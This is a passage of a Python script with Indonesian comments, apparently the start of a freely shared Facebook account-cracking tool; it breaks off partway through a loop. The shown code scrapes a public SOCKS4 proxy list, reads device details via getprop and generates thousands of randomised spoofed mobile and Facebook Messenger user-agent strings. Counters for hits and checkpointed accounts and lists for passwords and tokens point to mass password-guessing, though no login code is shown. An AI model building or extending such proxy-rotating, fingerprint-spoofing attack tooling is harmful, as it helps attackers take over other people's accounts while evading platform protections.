# jangan diperjual belikan script ini free
# jangan Ganti Owner atau hp mu rusak
# kalo gak ada hasil ,oprek sendiri jangan ngandelin orang lain
# github —» https://github.com/fanky86/Premium
# percuma ganteng kalo gak follow 


import os

# ------------------[  MODULE  ]-------------------#
M2 = "[#FF0000]"  # MERAH
H2 = "[#00FF00]"  # HIJAU
K2 = "[#FFFF00]"  # KUNING
B2 = "[#00C8FF]"  # BIRU
P2 = "[#FFFFFF]"  # PUTIH
U2 = "[#AF00FF]"  # UNGU
O2 = "[#FF8F00]"  # ORANGE


try:
    import rich
except ImportError:
    os.system("pip install rich")
from rich.console import Console

console = Console()

try:
    import rich
except ImportError:
    console.print(f" {K2}• {H2}Sedang Menginstall Modul Rich {H2}•{P2}")
    os.system("pip install rich")
try:
    import stdiomask
except ImportError:
    console.print(f" {K2}• {H2}Sedang Menginstall Modul stdiomask {H2}•{P2}")
    os.system("pip install stdiomask")
try:
    import bs4
except ImportError:
    console.print(f" {K2}• {H2}Sedang Menginstall Modul bs4 {H2}•{P2}")
    os.system("pip install bs4")


# ------------------[ IMPORT MODULE ]-------------------#
import requests, bs4, json, os, sys, random, datetime, time, re, rich, base64, subprocess, uuid, calendar
from time import sleep
import shutil
import hashlib
from datetime import date
from rich import pretty
from rich.tree import Tree
from rich.panel import Panel
from rich import print as cetak
from rich import print as rprint
from rich import print as prints
from rich.progress import track
from rich.text import Text as tekz
from rich.console import Console
from rich.text import Text
from rich.align import Align
from rich.columns import Columns
from rich.panel import Panel as nel
from rich.panel import Panel as panel
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup as par
from rich.console import Group as gp
from bs4 import BeautifulSoup as parser
from rich.columns import Columns as col
from rich.console import Console as sol
from rich.console import Console
from bs4 import BeautifulSoup as beautifulsoup
from rich.markdown import Markdown as mark
from concurrent.futures import ThreadPoolExecutor as tred
from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn


# ------------------[ GLOBAL NAME ]-------------------#
sekarang = calendar.timegm(time.gmtime(time.time()))
pretty.install()
CON = sol()
wa = Console()
ugen = []
ugent = []
console = Console()
ses = requests.Session()
hapus  = '[/]'
lisensiku=[]
temanku = []
id, id2, loop, ok, cp, akun, tokenku, uid, method, pwpluss, pwnya, tokenmu = [], [], 0, 0, 0, [], [], [], [], [], [], []
dia, ualu, ualuh = [], [], []
sys.stdout.write("\x1b]2; fanky ganteng\x07")

# ------------------[ PROXY BUAT NONTON BKP BTW FANKY GANTENG ]-------------------#
try:
    prox = requests.get(
        "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=80000&country=all&ssl=all&anonymity=all"
    ).text
    open(".prox.txt", "w").write(prox)
except Exception as e:
    Console().print(
        f" {H2}•{P2} Koneksi Internet Anda Tidak Terdeteksi Silahkan Cek Kuota Anda"
    )
    exit()
prox = open(".prox.txt", "r").read().splitlines()
###----------[ GET DATA DARI DEVICE ]---------- ###
android_version = subprocess.check_output("getprop ro.build.version.release",shell=True).decode("utf-8").replace("\n","")
try:simcard = subprocess.check_output("getprop gsm.operator.alpha",shell=True).decode("utf-8").split(",")[1].replace("\n","")
except:simcard = subprocess.check_output("getprop gsm.operator.alpha",shell=True).decode("utf-8").split(",")[0].replace("\n","")
#versi_app = str(random.randint(111111111,999999999))

# ------------------[ USER-AGENT ]-------------------#
def uaku():
    try:
        with open("fan.txt", "r") as file:
            ua = file.read().splitlines()
        for ub in ua:
            ugen.append(ub)
    except:
        url = "https://raw.githubusercontent.com/fanky86/Premium/main/fan.txt"
        response = requests.get(url)
        if response.status_code == 200:
            with open("fan.txt", "w") as file:
                aa = re.findall(r'line">(.*?)<', response.text)
                for un in aa:
                    file.write(un + "\n")
            with open("fan.txt", "r") as file:
                ua = file.read().splitlines()
            for ub in ua:
                ugen.append(ub)
        else:
            print("Gagal mengambil data dari GitHub")
try:
	uasayang = open("fan.txt", "r").read().splitlines()
	for fn in uasayang:
		ugen.append(fn)
except :
	ugent = "Mozilla/5.0 (Linux; Android 12; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36"
	

for t in range(1000):
    rc = random.choice
    rr = random.randint
    andro = f"{rr(4,13)}"
    samsung = rc([
        'SAMSUNG SM-G532G Build/MMB29T', 'SAMSUNG SM-G532M', 'SAMSUNG SM-G532M',
        'SAMSUNG SM-G975F', 'SAMSUNG SM-A515F', 'SAMSUNG SM-A715F', 'SAMSUNG SM-G532G',
        'SAMSUNG SM-J200G Build/LMY47X', 'SAMSUNG SM-G610M', 'SM-G532G Build/MMB29T',
        'SAMSUNG SM-G610F', 'SAMSUNG SM-G610F', 'SAMSUNG SM-G570M', 'SAMSUNG SM-G532MT',
        'SAMSUNG SM-A205G', 'SAMSUNG SM-J700M', 'SAMSUNG SM-N950F', 'SAMSUNG SM-G935F',
        'SAMSUNG SM-A217F', 'SAMSUNG SM-G965F', 'SAMSUNG SM-A105M', 'SAMSUNG SM-J500M',
        'SAMSUNG SM-G950F', 'SAMSUNG SM-A505F', 'SAMSUNG SM-G532M Build/MMB29T',
        'SAMSUNG SM-N975F', 'SAMSUNG SM-J701M', 'SAMSUNG SM-J710MN', 'SAMSUNG SM-N960F',
        'SAMSUNG SM-A505F', 'SAMSUNG SM-G532F', 'SAMSUNG SM-A515F', 'SAMSUNG SM-A107M'
    ])
    fanky = f"Dalvik/2.1.0 (Linux; U; Android {rr(1, 14)}; {samsung}) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/{rr(10, 14)}.{rr(1, 10)} Chrome/{rr(30, 270)}.0.{rr(15, 7000)}.{rr(20, 275)} Mobile Safari/537.36"
    d = f"Dalvik/2.1.0 (Linux; U; Android {andro}; V2043_21 Build/RP1A.200720.012) [FBAN/MessengerLite;FBAV/{rr(100,467)}.0.0.5.119;FBPN/com.facebook.mlite;FBLC/en_GB;FBBV/{rr(100000000,9000000000)};FBCR/Warid;FBMF/vivo;FBBD/vivo;FBDV/V2043_21;FBSV/{andro};FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{{density=2.25,height=,width=}};]"
    a = f"Dalvik/2.1.0 (Linux; U; Android {andro}; moto g52 Build/S1SRS32.38-132-8) [FBAN/MessengerLite;FBAV/{rr(100,467)}.0.0.7.131;FBPN/com.facebook.mlite;FBLC/en_GB;FBBV/543901789;FBCR/;FBMF/motorola;FBBD/motorola;FBDV/moto g52;FBSV/{andro};FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{{density=2.25,height=1024,width=2048}};]"
    n = f"Dalvik/2.1.0 (Linux; U; Android {andro}; SM-J330FN Build/PPR1.180610.011) [FBAN/MessengerLite;FBAV/{rr(100,467)}.0.0.3.109;FBPN/com.facebook.mlite;FBLC/en_GB;FBBV/{rr(100000000,9000000000)};FBCR/Grameenphone;FBMF/samsung;FBBD/samsung;FBDV/SM-J330FN;FBSV/{andro};FBCA/armeabi-v7a:armeabi;FBDM/{{density=2.25,height=,width=}};]"
    siska = f"Dalvik/2.1.0 (Linux; U; Android {andro}; vivo V3Max Build/LMY47V) [FBAN/Orca-Android;FBAV/{rr(100,467)}.0.0.16.158;FBPN/com.facebook.orca;FBLC/en_US;FBBV/{rr(100000000,9000000000)};FBCR/null;FBMF/vivo;FBBD/vivo;FBDV/vivo V3Max;FBSV/{andro};FBCA/armeabi-v7a:armeabi;FBDM/{{density=3.0,width=1080,height=1920}};]"
    ua = random.choice([fanky])
    ugen.append(ua)

for t in range(10000):
	a=random.choice(['1','1.0','1.5','2','2.0','2.5','3','3.0','3.5','4','4.0','4.5','5','5.0','5.5','6','6.0','6.5','7','7.0','7.5','8','8.0','8.5','9','9.0','9.5','10','10.0','10.5','11','11.0','11.5','12','12.0','12.5','13'])
	udin=random.choice(['R111-','R108-','R110-','R109-'])
	susu=random.choice(['Samsung Chromebook Plus (V2)'])
	dn=random.randrange(50,100)
	b=random.randrange(111111,210000)
	c=random.randrange(73,100)
	d=random.randrange(4200,4900)
	e=random.randrange(40,150)
	udinsad1=f'Mozilla/5.0 (Linux; Android {a}; SM-G531H Build/RKQ1.{b}.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{c}.0.{d}.{e} Mobile Safari/537.36'
	udinsad2=f'Mozilla/5.0 (Linux; Android {a}; SM-J610G Build/PPR1.{b}.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{c}.0.{d}.{e} Mobile Safari/537.36 HeyTapBrowser/40.8.8.9'
	udinsad3=f'Mozilla/5.0 (Linux; Android {a}; SM-A405FN Build/RP1A.{b}.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{c}.0.{d}.{e} Mobile Safari/537.36'
	udinsad4=f'Mozilla/5.0 (Linux; Android {a}; SM-X11O Build/SP1A.{b}.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{c}.0.{d}.{e} Mobile Safari/537.36'
	udinsad5=f'Mozilla/5.0 (Linux; U; Android {a}; Mi A3 Build/QKQ1.{b}.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{c}.0.{d}.{e} Mobile Safari/537.36 OPR/52.0.2254.54030'
	udinsad6=f'Mozilla/5.0 (Linux; Android {a}; GLi Lite Build/PPR1.{b}.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{c}.0.{d}.{e} Mobile Safari/537.36'
	udinsad7=f'Mozilla/5.0 (Linux; Android {a}; {susu} Build/{udin}15329.{dn}.0; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{c}.0.{d}.{e} Safari/537.36'
	udinsad8=f'Mozilla/5.0 (Linux; U; Android {a}; V2029 Build/QP1A.{b}.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{c}.0.{d}.{e} Mobile Safari/537.36 OPR/52.2.2254.54723'
	udinsad9=f'Mozilla/5.0 (Linux; U; Android {a}; Mi A2 Build/QKQ1.{b}.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{c}.0.{d}.{e} Mobile Safari/537.36 OPR/52.0.2254.54030'
	udinsad10=f'Mozilla/5.0 (Linux; U; Android {a}; RMX2020 Build/QP1A.{b}.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{c}.0.{d}.{e} Mobile Safari/537.36 OPR/51.0.2254.150807'
	udinsad11=f'Mozilla/5.0 (Linux; Android {a}; RMX2001 Build/QP1A.{b}.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{c}.0.{d}.{e} Mobile Safari/537.36'
	udinsad12=f'Mozilla/5.0 (Linux; Android {a}; RMX1941 Build/PPR1.{b}.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{c}.0.{d}.{e} Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/280.0.0.48.122;]'
	udinsad13=f'Mozilla/5.0 (Linux; Android {a}; RMX1825 Build/QP1A.{b}.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{c}.0.{d}.{e} Mobile Safari/537.36'
	udinsad14=f'Mozilla/5.0 (Linux; U; Android {a}; SM-A505F Build/QP1A.{b}.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{c}.0.{d}.{e} Mobile Safari/537.36 OPR/52.2.2254.54723'
	udinsad15=f'Mozilla/5.0 (Linux; U; Android {a}; SM-A205F Build/QP1A.{b}.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{c}.0.{d}.{e} Mobile Safari/537.36 OPR/52.2.2254.54723'
	udinsad16=f'Mozilla/5.0 (Linux; Android {a}; SM-M136B Build/SP1A.{b}.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{c}.0.{d}.{e} Mobile Safari/537.36'
	udinsad17=f'Mozilla/5.0 (Linux; Android {a}; SM-M317F Build/SP1A.{b}.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{c}.0.{d}.{e} Mobile Safari/537.36'
	udinsad18=f'Mozilla/5.0 (Linux; Android {a}; SM-M326B Build/RP1A.{b}.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{c}.0.{d}.{e} Mobile Safari/537.36'
	udinsad19=f'Mozilla/5.0 (Linux; Android {a}; SM-N986U Build/TP1A.{b}.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{c}.0.{d}.{e} Mobile Safari/537.36'
	udinsad20=f'Mozilla/5.0 (Linux; Android {a}; SM-N986B Build/RP1A.{b}.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{c}.0.{d}.{e} Mobile Safari/537.36'
	uaku2 = random.choice([udinsad1,udinsad2,udinsad3,udinsad4,udinsad5,udinsad6,udinsad7,udinsad8,udinsad9,udinsad10,udinsad11,udinsad12,udinsad13,udinsad14,udinsad15,udinsad16,udinsad17,udinsad18,udinsad19,udinsad20])
	ugen.append(uaku2)
	
	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
	c=random.choice(['SAMSUNG GT-I9506/XXUDOE4 Build/LRX22C'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/6.4 Chrome/'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{a} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	a='Mozilla/5.0 (Linux; Android'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='CPH1837)'
	e=random.randrange(100, 9999)
	f='AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Mobile Safari/537.36'
	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	ugen.append(uaku)
    
	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['Oppo A4 Build/MMB29M; wv)'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (Linux; Android 10'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['Mi 9T Pro Build/QKQ1.190825.002; wv)'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['CPH1931 Build/QKQ1.200209.002; wv)'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (Linux; U; Android '
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['ru-ru; Redmi 4A Build/N2G47H)'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['SM-N920)'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (X11'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['Linux x86_64)'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (Linux; Android '
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['Samsung Galaxy Note 9 Build/SM-N960N)'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/605.1. 15 (KHTML, like Gecko) Version/5.2 Chrome/'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/604.1.'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (Linux; Android '
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['M2012K11AG Build/L120G)'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko)86.0.4529.132 Version/4.0 Chrome/'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (Linux; Android '
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['MITO A75)'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
	c=random.choice(['en-US; vivo 1807 Build/OPM1.171019.026'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='UCBrowser/11.4.8.1012 Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)

	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
	c=random.choice(['SAMSUNG SM-F900U Build/PPR1.180610.011'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)#ffffff
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/9.2 Chrome/'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)

	aa='Mozilla/5.0 (Linux; U; Android;'
	b=random.choice(['6','7','8','9','10','11','12'])
	c='en-us; Redmi 5 Plus Build/OPM1.171019.019'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='UCBrowser/13.4.0.1306 Mobile Safari/537.36'
	uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
	ugen.append(uaku2)

	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['6','7','8','9','10','11','12'])
	c='Redmi Note 9 Pro)'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
	ugen.append(uaku2)

	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
	c=random.choice(['SAMSUNG GT-I9506/XXUDOE4 Build/LRX22C'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/6.4 Chrome/'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
	c=random.choice(['ASUS_Z01QD)'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
